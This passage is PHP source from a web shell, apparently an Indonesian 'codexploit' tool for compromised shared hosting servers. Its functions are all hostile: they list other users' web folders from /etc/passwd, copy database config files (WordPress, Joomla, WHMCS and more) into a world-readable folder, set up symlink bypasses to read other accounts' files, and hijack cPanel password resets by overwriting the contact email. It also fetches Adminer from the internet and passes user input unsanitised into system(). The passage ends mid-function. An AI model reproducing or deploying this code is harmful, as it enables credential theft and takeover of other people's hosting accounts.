		} elseif(preg_match("/vhosts/", $dir)) {
			$urls = explode("\r\n", $_POST['url']);
			if(isset($_POST['jump'])) {
				echo "<pre>";
				foreach($urls as $url) {
					$web_vh = "/var/www/vhosts/$url/httpdocs";
					if(is_dir($web_vh) === true) {
						if(is_readable($web_vh)) {
							$i++;
							$jrw = "[<font color=green>R</font>] <a href='?dir=$web_vh'><font color=#0046FF>$web_vh</font></a>";
							if(is_writable($web_vh)) {
								$jrw = "[<font color=green>RW</font>] <a href='?dir=$web_vh'><font color=#0046FF>$web_vh</font></a>";
							}
							echo $jrw."<br>";
						}
					}
				}
			if($i == 0) { 
			} else {
				echo "<br>Total ada ".$i." Kamar di ".$ip;
			}
			echo "</pre>";
			} else {
				echo '<center>
					  <form method="post">
					  List Domains: <br>
					  <textarea name="url" class="form-control">';
					  bing("ip:$ip");
				echo  '</textarea><br>
					  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">

					  </form></center>';
			}
		} else {
			echo "<pre>";
			$etc = fopen("/etc/passwd", "r") or die("<font color=red>Can't read /etc/passwd</font><br/>");
			while($passwd = fgets($etc)) {
				if($passwd == '' || !$etc) {
					echo "<font color=red>Can't read /etc/passwd</font><br/>";
				} else {
					preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
					foreach($user_jumping[1] as $user_pro_jump) {
						$user_jumping_dir = "/home/$user_pro_jump/public_html";
						if(is_readable($user_jumping_dir)) {
							$i++;
							$jrw = "[<font color=green>R</font>] <a href='?dir=$user_jumping_dir'><font color=#0046FF>$user_jumping_dir</font></a>";
							if(is_writable($user_jumping_dir)) {
								$jrw = "[<font color=green>RW</font>] <a href='?dir=$user_jumping_dir'><font color=#0046FF>$user_jumping_dir</font></a>";
							}
							echo $jrw;
							if(function_exists('posix_getpwuid')) {
								$domain_jump = file_get_contents("/etc/named.conf");
								if($domain_jump == '') {
									echo " => ( <font color=red>gabisa ambil nama domain nya</font> )<br>";
								} else {
									preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
									foreach($domains_jump[1] as $dj) {
										$user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
										$user_jumping_url = $user_jumping_url['name'];
										if($user_jumping_url == $user_pro_jump) {
											echo " => ( <u>$dj</u> )<br>";
											break;
										}
									}
								}
							} else {
								echo "<br>";
							}
						}
					}
				}
			}
			if($i == 0) { 
			} else {
				echo "<br>Total ada ".$i." Kamar di ".$ip;
			}
			echo "</pre>";
		}
		echo "</div>";
	} 
	
	/*
		Config
	*/
	if($_GET['aksi'] == 'config') {
		$etc = fopen("/etc/passwd", "r") or die("<pre><font color=red>Can't read /etc/passwd</font></pre>");
		$con = mkdir("codexploit_configs", 0777);
		$isi_htc = "Options all\nRequire None\nSatisfy Any";
		$htc = fopen("codexploit_configs/.htaccess","w");
		fwrite($htc, $isi_htc);
		while($passwd = fgets($etc)) {
			if($passwd == "" || !$etc) {
				echo "<font color=red>Can't read /etc/passwd</font>";
			} else {
				preg_match_all('/(.*?):x:/', $passwd, $user_config);
				foreach($user_config[1] as $user_con) {
					$user_config_dir = "/home/$user_con/public_html/";
					if(is_readable($user_config_dir)) {
						$grab_config = 
						[
							"/home/$user_con/.my.cnf" => "cpanel",
							"/home/$user_con/public_html/config/koneksi.php" => "Lokomedia",
							"/home/$user_con/public_html/forum/config.php" => "phpBB",
							"/home/$user_con/public_html/sites/default/settings.php" => "Drupal",
							"/home/$user_con/public_html/config/settings.inc.php" => "PrestaShop",
							"/home/$user_con/public_html/app/etc/local.xml" => "Magento",
							"/home/$user_con/public_html/admin/config.php" => "OpenCart",
							"/home/$user_con/public_html/application/config/database.php" => "Ellislab",
							"/home/$user_con/public_html/vb/includes/config.php" => "Vbulletin",
							"/home/$user_con/public_html/includes/config.php" => "Vbulletin",
							"/home/$user_con/public_html/forum/includes/config.php" => "Vbulletin",
							"/home/$user_con/public_html/forums/includes/config.php" => "Vbulletin",
							"/home/$user_con/public_html/cc/includes/config.php" => "Vbulletin",
							"/home/$user_con/public_html/inc/config.php" => "MyBB",
							"/home/$user_con/public_html/includes/configure.php" => "OsCommerce",
							"/home/$user_con/public_html/shop/includes/configure.php" => "OsCommerce",
							"/home/$user_con/public_html/os/includes/configure.php" => "OsCommerce",
							"/home/$user_con/public_html/oscom/includes/configure.php" => "OsCommerce",
							"/home/$user_con/public_html/products/includes/configure.php" => "OsCommerce",
							"/home/$user_con/public_html/cart/includes/configure.php" => "OsCommerce",
							"/home/$user_con/public_html/inc/conf_global.php" => "IPB",
							"/home/$user_con/public_html/wp-config.php" => "Wordpress",
							"/home/$user_con/public_html/wp/test/wp-config.php" => "Wordpress",
							"/home/$user_con/public_html/blog/wp-config.php" => "Wordpress",
							"/home/$user_con/public_html/beta/wp-config.php" => "Wordpress",
							"/home/$user_con/public_html/portal/wp-config.php" => "Wordpress",
							"/home/$user_con/public_html/site/wp-config.php" => "Wordpress",
							"/home/$user_con/public_html/wp/wp-config.php" => "Wordpress",
							"/home/$user_con/public_html/WP/wp-config.php" => "Wordpress",
							"/home/$user_con/public_html/news/wp-config.php" => "Wordpress",
							"/home/$user_con/public_html/wordpress/wp-config.php" => "Wordpress",
							"/home/$user_con/public_html/test/wp-config.php" => "Wordpress",
							"/home/$user_con/public_html/demo/wp-config.php" => "Wordpress",
							"/home/$user_con/public_html/home/wp-config.php" => "Wordpress",
							"/home/$user_con/public_html/v1/wp-config.php" => "Wordpress",
							"/home/$user_con/public_html/v2/wp-config.php" => "Wordpress",
							"/home/$user_con/public_html/press/wp-config.php" => "Wordpress",
							"/home/$user_con/public_html/new/wp-config.php" => "Wordpress",
							"/home/$user_con/public_html/blogs/wp-config.php" => "Wordpress",
							"/home/$user_con/public_html/configuration.php" => "Joomla",
							"/home/$user_con/public_html/blog/configuration.php" => "Joomla",
							"/home/$user_con/public_html/submitticket.php" => "^WHMCS",
							"/home/$user_con/public_html/cms/configuration.php" => "Joomla",
							"/home/$user_con/public_html/beta/configuration.php" => "Joomla",
							"/home/$user_con/public_html/portal/configuration.php" => "Joomla",
							"/home/$user_con/public_html/site/configuration.php" => "Joomla",
							"/home/$user_con/public_html/main/configuration.php" => "Joomla",
							"/home/$user_con/public_html/home/configuration.php" => "Joomla",
							"/home/$user_con/public_html/demo/configuration.php" => "Joomla",
							"/home/$user_con/public_html/test/configuration.php" => "Joomla",
							"/home/$user_con/public_html/v1/configuration.php" => "Joomla",
							"/home/$user_con/public_html/v2/configuration.php" => "Joomla",
							"/home/$user_con/public_html/joomla/configuration.php" => "Joomla",
							"/home/$user_con/public_html/new/configuration.php" => "Joomla",
							"/home/$user_con/public_html/WHMCS/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/whmcs1/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/Whmcs/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/whmcs/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/whmcs/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/WHMC/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/Whmc/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/whmc/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/WHM/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/Whm/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/whm/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/HOST/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/Host/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/host/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/SUPPORTES/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/Supportes/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/supportes/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/domains/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/domain/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/Hosting/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/HOSTING/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/hosting/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/CART/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/Cart/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/cart/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/ORDER/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/Order/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/order/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/CLIENT/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/Client/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/client/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/CLIENTAREA/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/Clientarea/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/clientarea/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/SUPPORT/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/Support/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/support/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/BILLING/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/Billing/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/billing/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/BUY/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/Buy/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/buy/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/MANAGE/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/Manage/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/manage/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/CLIENTSUPPORT/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/ClientSupport/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/Clientsupport/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/clientsupport/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/CHECKOUT/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/Checkout/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/checkout/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/BILLINGS/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/Billings/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/billings/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/BASKET/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/Basket/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/basket/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/SECURE/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/Secure/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/secure/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/SALES/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/Sales/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/sales/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/BILL/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/Bill/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/bill/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/PURCHASE/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/Purchase/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/purchase/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/ACCOUNT/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/Account/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/account/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/USER/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/User/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/user/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/CLIENTS/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/Clients/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/clients/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/BILLINGS/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/Billings/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/billings/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/MY/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/My/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/my/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/secure/whm/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/secure/whmcs/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/panel/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/clientes/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/cliente/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/support/order/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/bb-config.php" => "BoxBilling",
							"/home/$user_con/public_html/boxbilling/bb-config.php" => "BoxBilling",
							"/home/$user_con/public_html/box/bb-config.php" => "BoxBilling",
							"/home/$user_con/public_html/host/bb-config.php" => "BoxBilling",
							"/home/$user_con/public_html/Host/bb-config.php" => "BoxBilling",
							"/home/$user_con/public_html/supportes/bb-config.php" => "BoxBilling",
							"/home/$user_con/public_html/support/bb-config.php" => "BoxBilling",
							"/home/$user_con/public_html/hosting/bb-config.php" => "BoxBilling",
							"/home/$user_con/public_html/cart/bb-config.php" => "BoxBilling",
							"/home/$user_con/public_html/order/bb-config.php" => "BoxBilling",
							"/home/$user_con/public_html/client/bb-config.php" => "BoxBilling",
							"/home/$user_con/public_html/clients/bb-config.php" => "BoxBilling",
							"/home/$user_con/public_html/cliente/bb-config.php" => "BoxBilling",
							"/home/$user_con/public_html/clientes/bb-config.php" => "BoxBilling",
							"/home/$user_con/public_html/billing/bb-config.php" => "BoxBilling",
							"/home/$user_con/public_html/billings/bb-config.php" => "BoxBilling",
							"/home/$user_con/public_html/my/bb-config.php" => "BoxBilling",
							"/home/$user_con/public_html/secure/bb-config.php" => "BoxBilling",
							"/home/$user_con/public_html/support/order/bb-config.php" => "BoxBilling",
							"/home/$user_con/public_html/includes/dist-configure.php" => "Zencart",
							"/home/$user_con/public_html/zencart/includes/dist-configure.php" => "Zencart",
							"/home/$user_con/public_html/products/includes/dist-configure.php" => "Zencart",
							"/home/$user_con/public_html/cart/includes/dist-configure.php" => "Zencart",
							"/home/$user_con/public_html/shop/includes/dist-configure.php" => "Zencart",
							"/home/$user_con/public_html/includes/iso4217.php" => "Hostbills",
							"/home/$user_con/public_html/hostbills/includes/iso4217.php" => "Hostbills",
							"/home/$user_con/public_html/host/includes/iso4217.php" => "Hostbills",
							"/home/$user_con/public_html/Host/includes/iso4217.php" => "Hostbills",
							"/home/$user_con/public_html/supportes/includes/iso4217.php" => "Hostbills",
							"/home/$user_con/public_html/support/includes/iso4217.php" => "Hostbills",
							"/home/$user_con/public_html/hosting/includes/iso4217.php" => "Hostbills",
							"/home/$user_con/public_html/cart/includes/iso4217.php" => "Hostbills",
							"/home/$user_con/public_html/order/includes/iso4217.php" => "Hostbills",
							"/home/$user_con/public_html/client/includes/iso4217.php" => "Hostbills",
							"/home/$user_con/public_html/clients/includes/iso4217.php" => "Hostbills",
							"/home/$user_con/public_html/cliente/includes/iso4217.php" => "Hostbills",
							"/home/$user_con/public_html/clientes/includes/iso4217.php" => "Hostbills",
							"/home/$user_con/public_html/billing/includes/iso4217.php" => "Hostbills",
							"/home/$user_con/public_html/billings/includes/iso4217.php" => "Hostbills",
							"/home/$user_con/public_html/my/includes/iso4217.php" => "Hostbills",
							"/home/$user_con/public_html/secure/includes/iso4217.php" => "Hostbills",
							"/home/$user_con/public_html/support/order/includes/iso4217.php" => "Hostbills"
						];
						foreach($grab_config as $config => $nama_config) {
							$ambil_config = file_get_contents($config);
							if($ambil_config == '') {
							} else {
								$file_config = fopen("codexploit_configs/$user_con-$nama_config.txt","w");
								fputs($file_config,$ambil_config);
							}
						}
					}		
				}
			}	
		}
		echo "<center><a href='?dir=$path/codexploit_configs'><font color=lime>Done</font></a></center>";
	}
	
	/*
		Adminer
	*/
	if($_GET['aksi'] == 'adminer') {
		$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $path);
		function adminer($url, $isi) {
			$fp = fopen($isi, "w");
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, $url);
			curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
			curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
			curl_setopt($ch, CURLOPT_FILE, $fp);
			return curl_exec($ch);
			curl_close($ch);
			fclose($fp);
			ob_flush();
			flush();
		}
		if(file_exists('adminer.php')) {
			echo "<center><a href='$full/adminer.php' target='_blank'>-> Silahkan Login Adminer <-</a></font></center><br/>";
		} else {
			if(adminer("https://www.adminer.org/static/download/4.2.4/adminer-4.2.4.php","adminer.php")) {
				echo "<center><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font></center><br/>";
			} else {
				echo "<center><font color=red>gagal buat file adminer</font></center><br/>";
			}
		}
		exit;
	}


	/*
		Symlink
	*/
	if($_GET['aksi'] == 'symlink') {
		if(!is_file('named.txt')){
			$d00m = @file("/etc/named.conf");
		}else{
			$d00m = @file("named.txt");
		}
		if(!$d00m) {
			die ("<center>
				[ <a href='?dir=$path&aksi=symread'>Bypass Read</a> ] 
				[ <a href='?dir=$path&aksi=sym_404'>Symlink 404</a> ] 
				[ <a href='?dir=$path&aksi=sym_bypas'>Bypass Symlink</a> ]
				<br/>
				<font color='red'>Gagal Membaca /etc/named.conf</font>
				<br/><br/></center>");
		}
		else{
			echo "<center>
			[ <a href='?dir=$path&aksi=symread'>Bypass Read</a> ] 
			[ <a href='?dir=$path&aksi=sym_404'>Symlink 404</a> ] 
			[ <a href='?dir=$path&aksi=sym_bypas'>Bypass Symlink</a> ]
			<div class='tmp'></center>
				<table align='center' width='100%'>
					<thead class='bg-info'>
						<th>Domains</th>
						<th>Users</th>
						<th>symlink </th>
					</thead>";
					foreach($d00m as $dom){
						if(eregi("zone",$dom)){
							preg_match_all('#zone "(.*)"#', $dom, $domsws);
							flush();
							if(strlen(trim($domsws[1][0])) > 2){
								$user = posix_getpwuid(@fileowner("/etc/valiases/".$domsws[1][0]));
								flush();
								$site = $user['name'] ;
								@symlink("/","sym/root");
								$site = $domsws[1][0];
								$ir = 'ir';
								$il = 'il';
								if (preg_match("/.^$ir/",$domsws[1][0]) or preg_match("/.^$il/",$domsws[1][0]) ) {
									$site = ".$domsws[1][0].";
								}
								echo "
								<tr>
									<td>
										<a target='_blank' href=http://www.".$domsws[1][0]."/>".$site." </a>
									</td>
									<td>
										".$user['name']."
									</td>
									<td>
										<a href='sym/root/home/".$user['name']."/public_html' target='_blank'>Symlink</a>
									</td>
								</tr>";
								flush();
								flush();
							}
						}
					}
				echo "</table>
			</div><br/>";
		}
		exit;
	}

	if($_GET['aksi'] == 'symread') {
		echo "read /etc/named.conf";
		echo "<form method='post' action='?dir=$dir&aksi=symread&save=1'>
			<textarea class='form-control' rows='8' name='file'>";
			flush();
			flush();
			$file = '/etc/named.conf';
			$r3ad = @fopen($file, 'r');
			if ($r3ad){
				$content = @fread($r3ad, @filesize($file));
				echo "".htmlentities($content)."";
		}else if (!$r3ad) {
			$r3ad = @show_source($file) ;
		}else if (!$r3ad) {
			$r3ad = @highlight_file($file);
		}else if (!$r3ad) {
			$sm = @symlink($file,'sym.txt');
			if ($sm){
				$r3ad = @fopen('sym/sym.txt', 'r');
				$content = @fread($r3ad, @filesize($file));
				echo "".htmlentities($content)."";
			}
		}
		echo "</textarea><br/><input type='submit' class='btn btn-danger form-control' value='Save'/> </form>";
		if(isset($_GET['save'])){
			$cont = stripcslashes($_POST['file']);
			$f = fopen('named.txt','w');
			$w = fwrite($f,$cont);
			if($w){
				echo '<br/>save has been successfully';
			}
			fclose($f);
		}
		exit;
	}
	
	if ($_GET['aksi'] == 'sym_404'){
		echo '<h2>Symlink 404</h2>
		<form method="post">
			File Target: <input type="text" class="form-control" name="dir" value="/home/user/public_html/wp-config.php"><br>
			Save As: <input type="text" class="form-control" name="isi" placeholder="[Ex] file.txt"/><br/>
			<input type="submit" class="btn btn-danger btn-block" value="Execute" name="execute"/>
		</form>';
		if($_POST['execute']){
			rmdir("xploit404");
			mkdir("xploit404", 0777);
			$dir = $_POST['dir'];
			$isi = $_POST['isi'];
			system("ln -s ".$dir."xploit404/".$isi);
			symlink($dir,"xploit404/".$isi);
			$inija = fopen("xploit404/.htaccess", "w");
			fwrite($inija,"ReadmeName ".$isi."\nOptions Indexes FollowSymLinks\nDirectoryIndex ids.html\nAddType text/plain .php\nAddHandler text/plain .php\nSatisfy Any");
			echo'<a href="/xploit404/" target="_blank"> >>Sukses<< </a>';
		}
		exit;
	}
	
	
	if ($_GET['aksi'] == 'sym_bypas'){
		if(isset($_GET['save']) and isset($_POST['file']) or @filesize('passwd.txt') > 0){
			$cont = stripcslashes($_POST['file']);
			if(!file_exists('passwd.txt')){
				$f = @fopen('passwd.txt','w');
				$w = @fwrite($f,$cont);
				fclose($f);
			}
			if($w or @filesize('passwd.txt') > 0){
				echo "<div class='tmp'>
					<table width='100%'>
						<thead class='bg-info'>
							<th>Users</th>
							<th>symlink</th>
							<th>FTP</th>
						</thead>";
						flush();
						$fil3 = file('passwd.txt');
						foreach ($fil3 as $f){
							$u=explode(':', $f);
							$user = $u['0'];
							echo "<tr>
								<td class='left'>$user</td>
								<td>
									<a href='sym/root/home/$user/public_html' target='_blank'>Symlink </a>
								</td>
								<td>
									<a href='$pageFTP/sym/root/home/$user/public_html' target='_blank'>FTP</a>
								</td>
							</tr>";
					flush();
					flush();
				}
				die ("</tr></table></div>");
			}

		}

		echo "read /etc/passwd";
		echo "<br/><form method='post' action='?dir=$dir&aksi=sym_bypas&save=1'>
			<textarea class='form-control' rows='8' name='file'>";
				flush();
				$file = '/etc/passwd';
				$r3ad = @fopen($file, 'r');
				if ($r3ad){
					$content = @fread($r3ad, @filesize($file));
					echo "".htmlentities($content)."";
				}elseif(!$r3ad) {
					$r3ad = @show_source($file) ;
				}elseif(!$r3ad) {
					$r3ad = @highlight_file($file);
				}elseif(!$r3ad) {

					for($uid=0;$uid<1000;$uid++){
					$ara = posix_getpwuid($uid);
					if (!empty($ara)) {
						while (list ($key, $val) = each($ara)){
							print "$val:";
						}
						print "\n";
					}
				}
			}
			flush();
			echo "</textarea><br/>
			<input type='submit' class='btn btn-danger btn-block' value='Symlink'/><br/>
		</form>";
		flush();
		exit;
	}
	
	
	if ($_GET['aksi'] == 'CpanelReset') {
		echo '<br/><p class="text-center"><i class="fa fa-key"></i> Auto Reset Password Cpanel</p>
		<form method="POST">
			<div class="form-group">
				<input type="email" name="email" class="form-control" placeholder="Masukan Email..."/><br/>
				<input type="submit" name="submit" class="btn btn-danger btn-block" value="Send"/>
			</div>
		</form>';
		
		if(isset($_POST['submit'])){
			$user = get_current_user();
			$site = $_SERVER['HTTP_HOST'];
			$ips = getenv('REMOTE_ADDR');
			$email = $_POST['email'];
			$wr = 'email:'.$email;
			$f = fopen('/home/'.$user.'/.cpanel/contactinfo', 'w');
			fwrite($f, $wr); 
			fclose($f);
			$f = fopen('/home/'.$user.'/.contactinfo', 'w');
			fwrite($f, $wr); 
			fclose($f);
			$parm = $site.':2082/resetpass?start=1';
			echo '<br/>Url: '.$parm.'';
			echo '<br/>Username: '.$user.'';
			echo '<br/>Success Reset To: '.$email.'<br/><br/>';
		}
		exit;
	}
	
		if(isset($_GET['path'])){
			$path = $_GET['path'];
			chdir($path);
		}else{
			$path = getcwd();
		}
		$path = str_replace('\\','/',$path);
		$paths = explode('/',$path);
		echo "<br/>Lokasi Saat Ini => ";
		foreach($paths as $id=>$pat){
			if($pat == '' && $id == 0){
				$a = true;
				echo '<a href="?dir=/">/</a>';
				continue;
			}
			if($pat == '') continue;
			echo '<a href="?dir=';
			for($i=0;$i<=$id;$i++){
				echo "$paths[$i]";
				if($i != $id) echo "/";
			}
			echo '">'.$pat.'</a>/';
		}
		$scandir = scandir($path);
		echo "<hr>";
		echo '<div class="table-responsive-lg">
			<table class="table table-hover table-bordered text-white">
			<thead class="bg-warning text-dark text-center">
				<th scope="col">Nama</th>
				<th scope="col">Type</th>
				<th scope="col">Size</th>
				<th scope="col">Permission</th>
				<th scope="col">Action</th>
			</thead>';
			
			foreach($scandir as $dir){

			/* cek jika ini berbentuk folder */
			/* cek jika nama folder karaker terlalu panjang */
			if (strlen($dir) > 25) {
				$_dir = substr($dir, 0, 25)."...";												
			}else{
				$_dir = $dir;
			}
			if(!is_dir($path.'/'.$file)) continue;
				$size = filesize($path.'/'.$file)/1024;
				$size = round($size,3);

				if($size >= 1024){
					$size = round($size/1024,2).' MB';
				}else{
					$size = $size.' KB';
				}
			if(!is_dir($path.'/'.$dir) || $dir == '.' || $dir == '..') continue;
			echo 
				'<tr>
					<td class="text-white">
						<img src="http://aux.iconspalace.com/uploads/folder-icon-256-1787672482.png" class="ico"></img> <a href="?dir='.$path.'/'.$dir.'">'.$_dir.'</a></td>
					<td class="text-center">Directory</td>
					<td class="text-white"><center>'.$size.'</center></td>
					<td class="text-white"><center>';
					if(is_writable($path.'/'.$dir)) echo '<font color="#00ff00">';
					elseif(!is_readable($path.'/'.$dir)) echo '<font color="red">';
					echo perms($path.'/'.$dir);
					if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir)) echo '</font></center></td>
					<td><center>
						<a title="Ubah Nama" class="badge" href="?dir='.$path.'/'.$dir.'&aksi=rename_folder">&nbsp;Ubah Nama</a>&nbsp;&nbsp;
						<a title="Delete" class="badge" href="?dir='.$path.'/'.$dir.'&aksi=hapus_folder">&nbsp;Hapus</a>
					</td>
				';
		}

			foreach($scandir as $file){

				
				if(!is_file($path.'/'.$file)) continue;
				$size = filesize($path.'/'.$file)/1024;
				$size = round($size,3);

				if($size >= 1024){
					$size = round($size/1024,2).' MB';
				}else{
					$size = $size.' KB';
				}


				echo '<tr>
						<td><img src="';
					$ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
					if($ext == "php") {
						echo 'https://image.flaticon.com/icons/png/128/337/337947.png"';
					}elseif ($ext == "html") {
						echo 'https://image.flaticon.com/icons/png/128/136/136528.png"';
					}elseif ($ext == "css") {
						echo 'https://image.flaticon.com/icons/png/128/136/136527.png"';
					}elseif ($ext == "png") {
						echo 'https://image.flaticon.com/icons/png/128/136/136523.png"';
					}elseif ($ext == "jpg") {
						echo 'https://image.flaticon.com/icons/png/128/136/136524.png"';
					}elseif ($ext == "jpeg") {
						echo 'http://i.imgur.com/e8mkvPf.png"';
					}elseif($ext == "zip") {
						echo 'https://image.flaticon.com/icons/png/128/136/136544.png"';
					}elseif ($ext == "js") {
						echo 'https://image.flaticon.com/icons/png/128/1126/1126856.png';
					}elseif ($ext == "ttf") {
						echo 'https://image.flaticon.com/icons/png/128/1126/1126892.png';
					}elseif ($ext == "otf") {
						echo 'https://image.flaticon.com/icons/png/128/1126/1126891.png';
					}elseif ($ext == "txt") {
						echo 'https://image.flaticon.com/icons/png/128/136/136538.png';
					}elseif ($ext == "ico") {
						echo 'https://image.flaticon.com/icons/png/128/1126/1126873.png';
					}elseif ($ext == "conf") {
						echo 'https://image.flaticon.com/icons/png/512/1573/1573301.png';
					}elseif ($ext == "htaccess") {
						echo 'https://image.flaticon.com/icons/png/128/1720/1720444.png';
					}elseif ($ext == "sh") {
						echo 'https://image.flaticon.com/icons/png/128/617/617535.png';
					}elseif ($ext == "py") {
						echo 'https://image.flaticon.com/icons/png/128/180/180867.png';
					}elseif ($ext == "sql") {
						echo 'https://img.icons8.com/ultraviolet/2x/data-configuration.png';
					}elseif ($ext == "pl") {
						echo 'http://i.imgur.com/PnmX8H9.png';
					}elseif ($ext == "pdf") {
						echo 'https://image.flaticon.com/icons/png/128/136/136522.png';
					}elseif ($ext == "mp4") {
						echo 'https://image.flaticon.com/icons/png/128/136/136545.png';
					}elseif ($ext == "mp3") {
						echo 'https://image.flaticon.com/icons/png/128/136/136548.png';
					}elseif ($ext == "git") {
						echo 'https://image.flaticon.com/icons/png/128/617/617509.png';
					}elseif ($ext == "md") {
						echo 'https://image.flaticon.com/icons/png/128/617/617520.png';
					}else{
						echo 'http://icons.iconarchive.com/icons/zhoolego/material/256/Filetype-Docs-icon.png';
					}
					echo '" class="ico2"></img>';
					
					if (strlen($file) > 25) {
						$_file = substr($file, 0, 25)."...-.".$ext;												
					}else{
						$_file = $file;
					}

					echo' <a href="?dir='.$path.'&aksi=view&dirf='.$path.'/'.$file.'">'.$_file.'</a></td>';
					echo '<td class="text-center">';
				$ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
					
if($ext == "php") {
						echo 'application/octet-stream';
					}elseif ($ext == "html") {
						echo 'text/html';
					}elseif ($ext == "css") {
						echo 'application/octet-stream';
					}elseif ($ext == "png") {
						echo 'image/png';
					}elseif ($ext == "jpg") {
						echo 'image/jpg';
					}elseif ($ext == "jpeg") {
						echo 'image/jpeg';
					}elseif($ext == "zip") {
						echo 'dokumen/zip';
					}elseif ($ext == "js") {
						echo 'text/js';
					}elseif ($ext == "ttf") {
						echo 'application/octet-stream';
					}elseif ($ext == "otf") {
						echo 'application/octet-stream';
					}elseif ($ext == "txt") {
						echo 'text/txt';
					}elseif ($ext == "ico") {
						echo 'application/octet-stream';
					}elseif ($ext == "conf") {
						echo 'application/octet-stream';
					}elseif ($ext == "htaccess") {
						echo 'application/octet-stream';
					}elseif ($ext == "sh") {
						echo 'application/octet-stream';
